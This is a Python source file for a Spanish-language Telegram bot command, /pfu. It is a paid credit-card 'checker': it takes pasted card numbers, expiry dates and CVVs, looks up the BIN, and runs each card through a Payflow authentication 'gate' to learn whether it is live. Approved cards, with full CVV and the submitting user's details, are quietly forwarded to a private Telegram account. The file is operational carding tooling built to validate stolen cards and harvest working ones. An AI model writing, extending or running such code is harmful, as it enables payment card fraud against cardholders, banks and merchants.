# plugins/commands/pfu_command.py
import requests
import time
from srca.configs import addCommand, find_cards
from pyrogram import Client
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from db.mongo_client import MongoDB
from plugins.gates.src.Payflow import PayflowAuth

# Diccionario para rastrear el tiempo del último comando por usuario (antispam)
last_command_time = {}

@addCommand('pfu')
def pfu_command(client, m):
    """Comando /pfu para autenticación Payflow"""
    db = MongoDB()

    # Verificar autorización del chat
    if db.query_group(m.chat.id) is None:
        m.reply("❌ Chat no autorizado.")
        return

    # Verificar usuario registrado
    querY = db.query_user(int(m.from_user.id))
    if querY is None:
        m.reply("⚠️ Usa el comando /register para registrarte.")
        return

    # Verificar si el usuario está baneado
    if querY.get('role') == 'baneado':
        m.reply("🚫 Usuario baneado.")
        return

    # Verificar plan del usuario
    if querY.get('plan') == 'free':
        m.reply("❌ Usuario Free, adquiera el plan: https://t.me/DashSab")
        return

    # Aplicar antispam (10 segundos)
    user_id = m.from_user.id
    current_time = time.time()
    if user_id in last_command_time and current_time - last_command_time[user_id] < 10:
        wait = int(10 - (current_time - last_command_time[user_id]))
        m.reply(f"⏳ Antispam activado, espera {wait}s antes de volver a intentarlo.")
        return

    last_command_time[user_id] = current_time
    inicio = time.time()

    # Capturar los datos de la tarjeta
    ccs = find_cards(m.reply_to_message.text if m.reply_to_message else m.text)
    if ccs == '<b>ingrese la ccs.</b>':
        m.reply(ccs)
        return

    cc_num, exp_month, exp_year, cvv = ccs[:4]
    cc_com = f"{cc_num}|{exp_month}|{exp_year}|{cvv}"
    bin_number = cc_num[:6]

    # Obtener información del BIN
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        if response.status_code == 200:
            bin_info = response.json()
            bank = bin_info.get('bank', 'Desconocido')
            brand = bin_info.get('brand', 'Desconocido')
            country = bin_info.get('country_name', 'Desconocido')
            card_type = bin_info.get('type', 'Desconocido')
            country_flag = bin_info.get('country_flag', '')
        else:
            bank, brand, country, card_type, country_flag = 'Desconocido', 'Desconocido', 'Desconocido', 'Desconocido', ''
    except Exception as e:
        bank, brand, country, card_type, country_flag = 'Desconocido', 'Desconocido', 'Desconocido', 'Desconocido', ''
        print(f"❌ Error en BIN lookup: {e}")

    # Crear mensaje inicial de procesamiento con barra de progreso
    new = m.reply(f'''<b>あ 𝙋𝙖𝙮𝙛𝙡𝙤𝙬 ⸙
(↯) CC: {cc_com}
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Status: Processing... [□□□□□] 0%
(↯) From: {m.from_user.first_name}</b>''')

    time.sleep(2.0)
    new.edit_text(f'''<b>あ 𝙋𝙖𝙮𝙛𝙡𝙤𝙬 ⸙
(↯) CC: {cc_com}
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Status: Processing... [■□□□□] 20%
(↯) From: {m.from_user.first_name}</b>''')
    time.sleep(2.0)
    new.edit_text(f'''<b>あ 𝙋𝙖𝙮𝙛𝙡𝙤𝙬 ⸙
(↯) CC: {cc_com}
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Status: Processing... [■■□□□] 40%
(↯) From: {m.from_user.first_name}</b>''')
    time.sleep(2.0)
    new.edit_text(f'''<b>あ 𝙋𝙖𝙮𝙛𝙡𝙤𝙬 ⸙
(↯) CC: {cc_com}
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Status: Processing... [■■■□□] 60%
(↯) From: {m.from_user.first_name}</b>''')
    time.sleep(2.0)
    new.edit_text(f'''<b>あ 𝙋𝙖𝙮𝙛𝙡𝙤𝙬 ⸙
(↯) CC: {cc_com}
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Status: Processing... [■■■■□] 80%
(↯) From: {m.from_user.first_name}</b>''')
    time.sleep(2.0)
    new.edit_text(f'''<b>あ 𝙋𝙖𝙮𝙛𝙡𝙤𝙬 ⸙
(↯) CC: {cc_com}
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Status: Processing... [■■■■■] 100%
(↯) From: {m.from_user.first_name}</b>''')
    time.sleep(2.0)

    # Procesar la tarjeta con PayflowAuth
    try:
        print(f"DEBUG: Iniciando PayflowAuth con CC: {cc_com}")
        chk = PayflowAuth().main(cc_com)
        print(f"DEBUG: Resultado de PayflowAuth: {chk}")
    except Exception as e:
        chk = ('Error ⚠️', f"Execution failed: {str(e)}")
        print(f"❌ Error en PayflowAuth: {e}")

    fin = time.time()

    # Crear botones inline
    botones = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Canal", url="https://t.me/Deep_Chk"),
         InlineKeyboardButton("💰 Precios", url="https://t.me/Deep_Chk/24")]
    ])

    # Crear mensaje final con los resultados
    texto = f'''<b>あ 𝙋𝙖𝙮𝙛𝙡𝙤𝙬 ⸙
**- - - - - - - - - - - - - - - - - - -**\n
(↯) CC: <code>{cc_com}</code>
(↯) Status: {chk[0]}
(↯) Response: <code>{chk[1]}</code>
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Banco: {bank}
(↯) BIN: {bin_number} - {brand} - {card_type}
(↯) País: {country} {country_flag}
**- - - - - - - - - - - - - - - - - - -**\n
(↯) Proxy: Live ✅
(↯) Time: <code>{fin-inicio:0.4f}'s</code>
(↯) From: {m.from_user.first_name}</b>'''

    # Editar el mensaje con la respuesta final y botones
    new.edit_text(texto, reply_markup=botones)

    # Enviar log solo si es Approved! ✅
    if chk[0] == 'Approved! ✅':
        log_text = f"""<b>📝 Chequeo Realizado - Payflow</b>
━━━━━━━━━━━━━━━━━━
👤 <b>Usuario:</b> {m.from_user.first_name} (@{m.from_user.username})
🆔 <b>ID:</b> {m.from_user.id}
💳 <b>CC:</b> <code>{cc_com}</code>
🏦 <b>Banco:</b> {bank}
📌 <b>BIN:</b> {bin_number} - {brand} - {card_type}
🌍 <b>País:</b> {country} {country_flag}
✅ <b>Status:</b> {chk[0]}
📜 <b>Response:</b> <code>{chk[1]}</code>
⏳ <b>Tiempo:</b> <code>{fin-inicio:0.4f}'s</code>
━━━━━━━━━━━━━━━━━━"""

        try:
            client.send_message(7389519750, log_text)
            print(f"✅ Log enviado a 7389519750 (Approved)")
        except Exception as e:
            print(f"❌ Error enviando al log privado: {e}")